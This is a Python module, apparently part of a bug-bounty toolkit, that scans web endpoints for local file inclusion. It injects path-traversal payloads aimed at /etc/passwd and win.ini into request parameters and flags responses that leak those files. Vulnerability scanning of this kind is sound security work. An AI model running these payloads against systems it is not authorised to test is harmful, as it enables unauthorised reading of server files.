#!/usr/bin/env python3
"""
lfi.py — Local File Inclusion / Path Traversal detection (P1)
===========================================================
Sends traversal payloads into a parameter and looks for the contents of a
known local file (Unix /etc/passwd or Windows win.ini) leaking into the
response. Pure checkers are unit-testable; only ``test_endpoint``/``run_lfi``
do I/O.
"""
from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding
    from toolkit.infra import inject
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


# (payload, signature) pairs. Signature presence in the response == disclosure.
_PAYLOADS = [
    ("../../../../../../../../etc/passwd", "root:x:0:0:"),
    ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0:"),
    ("....//....//....//....//etc/passwd", "root:x:0:0:"),
    ("..\\..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:x:0:0:"),
]


def _detect_disclosure(text: str, sig: str) -> bool:
    return sig in (text or "")


@dataclass
class LfiFinding:
    url: str
    method: str
    param: str
    payload: str
    evidence: str = ""

    def to_dict(self) -> dict:
        return self.__dict__.copy()


async def _send(client, endpoint: Any, param: str, value: str, *,
                timeout: float = 10.0) -> str:
    via = getattr(endpoint, "inject_via", "query")
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-lfi/1.0)"}
    try:
        if via == "body_form":
            r = await client.request(endpoint.method, endpoint.url, headers=headers,
                                     data={param: value}, timeout=timeout)
        elif via == "body_json":
            r = await client.request(endpoint.method, endpoint.url,
                                     headers={**headers, "Content-Type": "application/json"},
                                     json={param: value}, timeout=timeout)
        else:
            full = inject.build_injection_url(endpoint.url, param, value)
            r = await client.request(endpoint.method, full, headers=headers, timeout=timeout)
        return getattr(r, "text", "") or ""
    except Exception:
        return ""


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0) -> list[LfiFinding]:
    params = list(getattr(endpoint, "params", []) or [])
    if not params:
        return []
    out: list[LfiFinding] = []
    seen: set[str] = set()
    for param in params:
        for p, sig in _PAYLOADS:
            body = await _send(client, endpoint, param, p, timeout=timeout)
            if _detect_disclosure(body, sig):
                if param not in seen:
                    seen.add(param)
                    out.append(LfiFinding(endpoint.url, endpoint.method, param, p,
                                          f"disclosed local file signature '{sig}'"))
                break
    return out


async def run_lfi(endpoints: list[Any], client: object, *,
                  timeout: float = 10.0, concurrency: int = 10) -> list[LfiFinding]:
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)
    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[LfiFinding],
                           source_tool: str = "lfi.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        detail = (f"Local File Inclusion / path traversal via parameter "
                  f"'{f.param}' ({f.method} {f.url})")
        if _HAVE_FINDING:
            nf = NormalizedFinding(source_tool=source_tool, host=_host(f.url), url=f.url,
                                   vuln_class_key="LOCAL_FILE_INCLUSION", severity="HIGH",
                                   title=f"LFI / Path Traversal in {f.param}",
                                   detail=detail, evidence=f"payload={f.payload} {f.evidence}",
                                   confidence="confirmed")
            d = nf.to_dict()
            d["param"] = f.param
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "param": f.param, "vuln_class_key": "LOCAL_FILE_INCLUSION", "severity": "HIGH",
                 "title": f"LFI / Path Traversal in {f.param}", "detail": detail,
                 "evidence": f.payload, "confidence": "confirmed"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
